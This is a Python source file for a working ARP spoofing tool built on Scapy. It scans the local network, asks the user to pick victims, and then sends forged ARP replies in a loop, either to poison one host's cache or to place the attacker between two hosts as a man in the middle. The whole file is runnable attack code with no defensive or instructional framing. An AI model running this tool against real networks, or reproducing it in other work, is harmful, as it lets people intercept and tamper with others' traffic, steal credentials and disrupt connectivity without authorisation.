from neighbourhood import start_scan
import sys
import getopt
from scapy.all import *
import subprocess
import re

def get_mac_address(interface):
    try:
        output = subprocess.check_output(['ip', 'link', 'show', interface], universal_newlines=True)
        mac_address = re.search(r'ether\s+([^\s]+)', output).group(1)
        return mac_address
    except (subprocess.CalledProcessError, AttributeError):
        return None

class Address:
    def __init__(self, mac, ip, interface):
        self.mac = mac
        self.ip = ip
        self.interface = interface

def create_ARP(interface, mac_attacker, victim, destination):
    arp= Ether() / ARP()
    arp[Ether].src = mac_attacker
    arp[ARP].hwsrc = mac_attacker
    arp[ARP].psrc = destination.ip
    arp[ARP].hwdst = victim.mac
    arp[ARP].pdst = victim.ip
    
    return arp

def send_ARP(interface, mac_attacker, victim, destination):

    arp = create_ARP(interface, mac_attacker, victim, destination)

    '''arp= Ether() / ARP()
    arp[Ether].src = mac_attacker
    arp[ARP].hwsrc = mac_attacker
    arp[ARP].psrc = destination.ip
    arp[ARP].hwdst = victim.mac
    arp[ARP].pdst = victim.ip'''

    sendp(arp, iface=interface, loop=1, inter=30, multi=True)

def send_mitm_ARP(interface, mac_attacker, victim1, victim2):

    arp1 = create_ARP(interface, mac_attacker, victim1, victim2)
    arp2 = create_ARP(interface, mac_attacker, victim2, victim1)
    
    '''arp1= Ether() / ARP()
    arp1[Ether].src = mac_attacker
    arp1[ARP].hwsrc = mac_attacker
    arp1[ARP].psrc = victim2.ip
    arp1[ARP].hwdst = victim1.mac
    arp1[ARP].pdst = victim1.ip

    arp2= Ether() / ARP()
    arp2[Ether].src = mac_attacker
    arp2[ARP].hwsrc = mac_attacker
    arp2[ARP].psrc = victim1.ip
    arp2[ARP].hwdst = victim2.mac
    arp2[ARP].pdst = victim2.ip
'''
    sendp([arp1, arp2], iface=interface, loop=1, inter=15)


def print_menu(scan_list):
    for i, dev in enumerate(scan_list):
        print(' ' + str(i+1) + ':')
        print('\tMAC = ' + str(dev.mac))
        print('\tIP  = ' + str(dev.ip))

def mitm_attack(scan_list):
    print('Man In The Middle Attack\n')

    print('Choose first victim from list:')
    print_menu(scan_list)
    index1 = int(input(' >> '))

    print('Choose second victim from list:')
    print_menu(scan_list)
    index2 = int(input(' >> '))
    interface = scan_list[0].interface
    send_mitm_ARP(interface, get_mac_address(interface), scan_list[index1-1], scan_list[index2-1])

def spoof_attack(scan_list):
    print('Spoofing Attack\n')


    print('Choose victim from list:')
    print_menu(scan_list)
    index1 = int(input(' >> '))

    print('Choose destination from list:')
    print_menu(scan_list)
    index2 = int(input(' >> '))

    interface = scan_list[0].interface
    send_ARP(interface, get_mac_address(interface), scan_list[index1-1], scan_list[index2-1])

def usage():
    print("Usage: %s [-m] [-v] <interface>" % sys.argv[0])

if __name__ == '__main__':
    try:
        opts, args = getopt.getopt(sys.argv[1:], 'hmv', ['help', 'mitm', 'verbose'])
    except getopt.GetoptError as err:
        print(str(err))
        usage()
        sys.exit(2)

    mitm = False
    verbose = False

    if len(args) != 1:
        usage()
        sys.exit()

    for o, a in opts:
        if o in ('-h', '--help'):
            usage()
            sys.exit()
        elif o in ('-m', '--mitm'):
            mitm = True
        elif o in ('-v', '--verbose'):
            verbose = True
        else:
            assert False, 'unhandled option'

    scan_list = [Address(*x) for x in start_scan(verbose, args[0])]

    if mitm:
        mitm_attack(scan_list)
    else:
        spoof_attack(scan_list)
